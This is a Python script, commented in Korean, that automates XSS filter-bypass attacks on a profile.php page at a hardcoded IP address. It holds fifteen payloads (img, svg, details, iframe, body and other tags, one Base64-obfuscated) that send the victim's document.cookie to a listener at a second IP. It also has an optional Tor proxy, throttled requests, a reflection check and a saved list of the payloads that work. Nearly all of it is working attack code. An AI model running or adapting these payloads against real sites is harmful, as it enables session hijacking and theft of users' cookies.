#!/usr/bin/env python3
"""
Advanced XSS Tester - profile.php 필터 우회 자동 테스트
"""

import requests
import time
import sys
from advanced_payloads import AdvancedPayloadGenerator
from urllib.parse import urlencode

# 색상
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def test_payload(base_url, payload, session, email="test@test"):
    """
    페이로드를 profile.php에 테스트

    Args:
        base_url: http://3.34.90.201/profile.php
        payload: XSS 페이로드
        session: requests 세션
        email: 이메일 파라미터
    """
    try:
        params = {
            'email': email,
            'full_name': payload
        }

        url = f"{base_url}?{urlencode(params)}"

        print(f"{Colors.BLUE}Testing URL:{Colors.END}")
        print(f"  {url[:120]}...")

        response = session.get(url, timeout=10)

        result = {
            'status_code': response.status_code,
            'success': response.status_code == 200,
            'reflected': payload in response.text,
            'response_length': len(response.text),
            'payload': payload,
            'url': url
        }

        # 반사 여부 확인 (더 세밀하게)
        if '<img' in payload and '<img' in response.text:
            result['tag_reflected'] = True
        elif '<svg' in payload and '<svg' in response.text:
            result['tag_reflected'] = True
        else:
            result['tag_reflected'] = False

        return result

    except Exception as e:
        return {
            'status_code': 0,
            'success': False,
            'error': str(e),
            'payload': payload
        }

def main():
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}🎯 Advanced XSS Filter Bypass Tester{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    # 설정
    TARGET_URL = "http://3.34.90.201/profile.php"
    LISTENER_URL = "http://3.113.201.239:9999/steal"
    USE_TOR = False
    DELAY = 2

    # 세션 설정
    session = requests.Session()
    if USE_TOR:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    # 페이로드 생성
    gen = AdvancedPayloadGenerator(LISTENER_URL)

    # 우선순위 높은 페이로드들
    priority_payloads = [
        # 1. 슬래시 구분자 (가장 유망)
        '<img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',
        '<img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/>',

        # 2. SVG 태그
        '<svg/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',
        '<svg/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/>',

        # 3. 이미지 로드 (fetch 없이)
        '<img/src=x/onerror=new(Image).src="http://3.113.201.239:8888/steal?c="+document.cookie>',

        # 4. location 리다이렉트
        '<img/src=x/onerror=location="http://3.113.201.239:8888/steal?c="+document.cookie>',

        # 5. details 태그
        '<details/open/ontoggle=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',

        # 6. input autofocus
        '<input/onfocus=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/autofocus>',

        # 7. 탭 구분자
        '<img\tsrc=x\tonerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',

        # 8. 줄바꿈 구분자
        '<img\nsrc=x\nonerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',

        # 9. Base64 난독화
        '<img/src=x/onerror=eval(atob("ZmV0Y2goImh0dHA6Ly8zLjExMy4yMDEuMjM5Ojg4ODgvc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZSk="))>',

        # 10. iframe javascript:
        '<iframe/src="javascript:fetch(\'http://3.113.201.239:8888/steal?c=\'+document.cookie)">',

        # 11. body onload
        '<body/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',

        # 12. video/audio
        '<video/src/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',
        '<audio/src/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>',
    ]

    print(f"{Colors.BLUE}Target: {TARGET_URL}{Colors.END}")
    print(f"{Colors.BLUE}Listener: {LISTENER_URL}{Colors.END}")
    print(f"{Colors.BLUE}Total Payloads: {len(priority_payloads)}{Colors.END}\n")

    results = []
    success_count = 0

    for idx, payload in enumerate(priority_payloads, 1):
        print(f"\n{Colors.YELLOW}[{idx}/{len(priority_payloads)}]{Colors.END}")
        print(f"Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        result = test_payload(TARGET_URL, payload, session)
        results.append(result)

        if result.get('success'):
            if result.get('tag_reflected'):
                print(f"{Colors.GREEN}✓ SUCCESS! Tag reflected in response!{Colors.END}")
                success_count += 1

                # 성공 시 상세 정보
                print(f"{Colors.GREEN}  Status: {result['status_code']}{Colors.END}")
                print(f"{Colors.GREEN}  Response Length: {result['response_length']} bytes{Colors.END}")
                print(f"{Colors.GREEN}  Full URL: {result['url'][:100]}...{Colors.END}")
            else:
                print(f"{Colors.YELLOW}⚠ Sent but tag not reflected (may be filtered){Colors.END}")
        else:
            print(f"{Colors.RED}✗ Failed: {result.get('error', 'Unknown error')}{Colors.END}")

        time.sleep(DELAY)

    # 결과 요약
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 Test Results{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")
    print(f"Total Tests: {len(priority_payloads)}")
    print(f"{Colors.GREEN}Successful (Tag Reflected): {success_count}{Colors.END}")
    print(f"{Colors.RED}Failed/Filtered: {len(priority_payloads) - success_count}{Colors.END}\n")

    # 성공한 페이로드 목록
    if success_count > 0:
        print(f"{Colors.GREEN}✓ Working Payloads:{Colors.END}\n")
        for r in results:
            if r.get('tag_reflected'):
                print(f"{Colors.GREEN}  ✓ {r['payload'][:100]}...{Colors.END}\n")
                print(f"    URL: {r['url']}\n")

    # 결과 저장
    import json
    with open('advanced_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f"💾 Results saved to: advanced_test_results.json\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ Test interrupted{Colors.END}")
        sys.exit(0)
